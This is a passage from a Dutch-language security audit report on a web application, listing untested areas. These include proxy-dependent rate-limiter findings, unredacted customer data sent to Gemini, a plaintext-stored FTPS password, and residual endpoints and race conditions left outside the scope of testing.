  en de `frame-ancestors`-lijst van het portaal (BUG-087) moeten daar geverifieerd worden.
- **De echte `trust proxy`-topologie.** BUG-009, BUG-074 en BUG-082 zijn bewezen tegen een opstelling
  **zonder** reverse proxy. Of Coolify/Traefik een door de client meegestuurde `X-Forwarded-For`
  overschrijft of eraan toevoegt, bepaalt of de rate-limiter-omzeiling in productie net zo triviaal is.
- **Socket.IO-CORS in productie**, netwerksegmentatie (bepaalt wat BUG-071/BUG-077 daadwerkelijk kunnen
  bereiken), databaserechten van de app-user, volume-permissies en logretentie (bepaalt de reikwijdte
  van BUG-079).

**Gegevensverwerking door derden — niet onderzocht**
- **Gemini:** `server/utils/invoice-scanner.ts:13` en `server/utils/fine-scanner.ts:85-95` sturen
  geüploade bonnen en boetebrieven — met klantnaam, kenteken, bedragen en mogelijk identificerende
  gegevens — als `inlineData` naar Google, **zonder redactie**. Fase-1a-risico #15 is nooit getest: er
  is niet vastgesteld wat er precies verzonden wordt, welke bewaartermijn geldt of er een
  verwerkersovereenkomst is. Dit is primair een AVG-/contractvraag, geen codebevinding.
- **CJIB:** het FTPS-wachtwoord staat onversleuteld in de database (wel gemaskeerd bij uitlezen); de
  poller verbindt periodiek met een door de gebruiker opgegeven host (BUG-071). De feitelijke
  CJIB-koppeling en de bestandsverwerking zelf zijn niet getest.

**Restscope vanuit fase 6–7**
- De contractgeneratie-endpoints `/api/contracts/generate*`, `/preview*` en `/data/:id`
  (`routes.ts:5451-6117`) zijn statisch als `requireAuth`-only vastgesteld maar **niet runtime getest**
  met een laag-geprivilegieerd account (zie §5, hypothese #9).
- `fuzz-get.mjs`, `malformed-json.mjs` en `session-tests.mjs` zijn deze ronde **niet opnieuw gedraaid**;
  hun resultaten (BUG-103, de malformed-JSON-uitkomsten, de vier sessietests) zijn ongewijzigd
  overgenomen uit de vorige run. Die vier sessietests (CSRF-token uit een andere sessie → 403;
  gekopieerde `connect.sid` → 401) waren toen **allemaal in orde** — geen sessiefixatie of -hijack
  waargenomen.
- De root cause van **BUG-089** (`/api/reports/maintenance-costs` → 500) is niet uitgezocht; alleen de
  respons is vastgelegd.
- Race-condities en TOCTOU buiten BUG-090 (bijvoorbeeld tussen `listBackups()` en `restoreDatabase()`,
  of de contractnummer-uniciteitscheck op `routes.ts:3580-3596`), de cryptografische review van de
  PDF-generatie en van `server/backupVerification.ts`, en de testsuite in `server/__tests__` zijn niet
  bekeken.
